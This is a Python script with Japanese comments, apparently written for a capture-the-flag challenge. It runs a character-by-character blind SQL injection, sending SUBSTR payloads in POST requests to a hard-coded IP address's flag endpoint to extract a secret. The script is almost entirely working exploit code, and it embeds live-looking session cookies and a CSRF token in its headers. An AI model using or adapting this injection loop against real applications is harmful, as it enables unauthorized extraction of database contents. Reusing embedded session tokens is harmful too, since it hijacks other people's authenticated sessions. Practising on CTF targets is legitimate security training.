import requests
import string
import sys

# --- 個別設定

# ターゲットのURL
URL = "http://13.114.247.151:50006/api/flag"

# リクエストヘッダー
# Content-TypeとContent-Lengthはrequestsライブラリが自動で設定するため、含めません。
HEADERS = {
    'Accept-Language': 'ja',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    'Accept': '*/*',
    'Origin': 'http://13.114.247.151:50006',
    'Referer': 'http://13.114.247.151:50006/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Cookie': 'easy_ctf_admin_session=eyJpdiI6IkxXRjc1QktWWUk0aENKeWlKUDUxeFE9PSIsInZhbHVlIjoibnQ0UTVCUElDVWUyeWpYdkhpVUZ0OGt3VTRNQWs2NWlncFE1V2ZVdmtjK2cwVk41THlyWnRkQ2xPTDlhczV4ZXMzcUV2VitJUzU4SFZYeHRZRkF4aUNNWm1YcHVvM2lYSC9qWjcvTndJZW8rTCtWL21EcXZRVk9JME9iNC8yRXciLCJtYWMiOiI2ODRjMGIwY2E0ZWY0OGRlY2NmYmU5ZmRlZDllNTA5NzBjMzUzNGIzNWM2MjdkMGQxMGZiOGIyNDYyMjVjMzgzIiwidGFnIjoiIn0%3D; easy_ctf_brokenauth_session=eyJpdiI6IlVSZFRKdVpyR2xScUJaYUVWM3Y3dXc9PSIsInZhbHVlIjoiQzZVbmVJWkMyeVlzTFhZYlE1Z3FUd0Rzb1ZPR0pzdG5ZMm5sYmwvK1h0QVlBUUFGdWhGcUNPbmFMMzZVTGlNWnZZdHFaNytIb2VVZmNqTkNrWmhHeXd2N2Q1ajU1eC9rTnkvcUN6N2FsWk5ORGx5RVlxSmNPbWdPYWFkbHpSUHkiLCJtYWMiOiIxNDFkOTM3MDdjN2FiMzUxMGExMDYwMTY5ODg1ZGZmNWNlMDQyYmIwYzNmOWUyMmVkY2Q0NzZjOGU1NDFhMmUxIiwidGFnIjoiIn0%3D; easy_ctf_info_session=eyJpdiI6ImtVSVA3YWZmTTZlWkZHOW5jeEFkYXc9PSIsInZhbHVlIjoiL0VIcFVva2pCRVlZbHBLMXdWYzJEVHVkU202SHNDeS9QRUYyWVRqNWlVVHkwTUwwRGsyWWZBRUVrUEZyZDdXRjBZdEdvYVNXQjV5aFJHbktOa2Z2TFc5Tk1QRTY4SGMrQ2EzancwRk1aRUJKZUQzeGJSdFBxUDltUFpmbFprRXUiLCJtYWMiOiJjZmYwYjllZjBkYzk1YjJkZWViNzUyMmJkZjUxNmYxNzBiM2Q3ZWViMWEyY2EwODFlNWQyMzQ3OTYxNmE0MDc0IiwidGFnIjoiIn0%3D; easy_ctf_publicsetting_session=eyJpdiI6IitTdUlGajk2aWZNNDI2RlpzNHl4M2c9PSIsInZhbHVlIjoiQXk0czR5N3lRUG1UVmtXbTI4cmg0UFBEdUpZczJFMVNZbmdnUzBMN1VWRFliTzYrVTB1dnUrbEt3WldTVnYwMmEyWDVUN2I4emFidlc2cEtudHhKaEJlNVdaUGtWVUFaNFRUSlNEczhnWUlVdThDc2ZQU3VHN1MrazFBeDkwQ2YiLCJtYWMiOiI3NjM4OGY3MzBjZmUwZjM4NWYyNjMyYWU0NWE2ZWM4ZWQ3ZWIwOWI3OTBmMzIwMDEyZGYzZDkzNGRlMTBjZWI2IiwidGFnIjoiIn0%3D; easy_ctf_privilegeescalation_session=eyJpdiI6IjBjWDlDM2FRVk80a0dCUEFNOFB4eGc9PSIsInZhbHVlIjoiT3IrdXVpSU9DNkxrY0ZhOGwwWDA4V1dndjdJWlhGVDlkMXlTOTlvaHRTcjBuWFM3bDAxbzA4QzUrY01vZDVzUmZuQTloem1iY2hQUElxVi8wWjcxeDhaSjhUWmtlRkZuVlRqWENlcjRxUWlaUmNIbTBldktzNHpRelJHcFBoWkoiLCJtYWMiOiIzYzI5ZGE2OTZiMDNkMTA1YTUzYjhiMjhiZjZkNTQ3NjlhYWYyN2I3MGYwYzY0ZTQ0N2UyMmYwZGNjYTVjZWYxIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IlErWjhwWEsrM3gxWnhpRGZBUzhsWXc9PSIsInZhbHVlIjoicmcyK05aTlQwNDBqdm5VMEJOaXh1WmR6emlSZjExekZ0b3B0bzgyTzV6VVZFcFVhbWZ0RW9DNXljWWt1T3IyRXR3VGlLejRTeEN0L2RzY0tGUEtRei84MlJ6b1Q2WXVQN2htNUxhaTVnK2VXUUVGSzBkQlNYeTBONEdGT3lETWgiLCJtYWMiOiI5ZGY0MzY3NTBlZTcyNzgxNWVhNDYxNWRkYjBkMzgxNjQyMmFlNDU2YWU0MzBjNjRhYmQ3NjI5N2YyODZjYzJmIiwidGFnIjoiIn0%3D; easy_ctf_blindsqli_session=eyJpdiI6ImZpMkM3M0lzMDJjYk9GVWx5MWxrVnc9PSIsInZhbHVlIjoiWm5ZOWdLNWFMSUFIcG90Y0FkNHd5T1FVdWZCelMwTFFOd000QWFkelJxTVpMN2RhTHhqVHJITFMxeUFCU1FsZkhIRnBxL0hPQnBiVDRHRUNZOEVsbkwwZ3l3dzJiSVp6MTh1amNPSVRxWU9NWFpUMzdka2t1MU1rR3YxWHF2NTAiLCJtYWMiOiJkNTVjMDk2ZGI2ODYyZTk2YjNiMWRlZmRjMDI2ZTc3OTlhOTAwMmZlYTFmMDMzNmU1OGE3MzkyNjk5NzJhZDg2IiwidGFnIjoiIn0%3D',
    'Connection': 'keep-alive',
}

# フォームデータから取得したCSRFトークン
TOKEN = "e34yR3bqotaRRloOcnuGod2gVbstipUxY0juyyha"

# フラグに含まれる可能性のある文字セット
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-{}"


def main():
    """
    ブラインドSQLインジェクションを実行し、フラグを特定するメイン関数
    """
    found_flag = ""
    position = 1

    print("ブラインドSQLインジェクション攻撃を開始します...")
    print("発見したフラグ: ", end="", flush=True)

    while True:
        found_char_in_pos = False
        for char_to_test in CHARSET:
            # 現在の位置と文字でペイロードを構築
            # 例: ' OR SUBSTR(flag, 1, 1) = 'f'--
            payload = f"' OR SUBSTR(flag, {position}, 1) = '{char_to_test}'--"

            # POSTリクエストで送信するフォームデータ
            data = {
                '_token': TOKEN,
                'flag': payload
            }

            try:
                # POSTリクエストを送信
                response = requests.post(URL, headers=HEADERS, data=data, timeout=10)
                response.raise_for_status()  # エラーがあれば例外を発生させる

                # レスポンスに "Correct" が含まれているかチェック
                if '"Correct"' in response.text:
                    found_flag += char_to_test
                    sys.stdout.write(char_to_test)
                    sys.stdout.flush()
                    found_char_in_pos = True
                    break  # 文字が見つかったので、次の位置へ

            except requests.exceptions.RequestException as e:
                print(f"\nリクエスト中にエラーが発生しました: {e}")
                return

        # 現在のポジションで文字が見つかった場合
        if found_char_in_pos:
            position += 1
            # 最後の文字が '}' ならフラグの終わりと判断して終了
            if char_to_test == '}':
                print("\n\nフラグを発見しました (閉じ括弧を検出)。")
                break
        # 現在のポジションでどの文字も一致しなかった場合
        else:
            print("\n\n攻撃が完了しました (これ以上文字が見つかりませんでした)。")
            break

    print(f"最終的なフラグ: {found_flag}")

if __name__ == "__main__":
    main()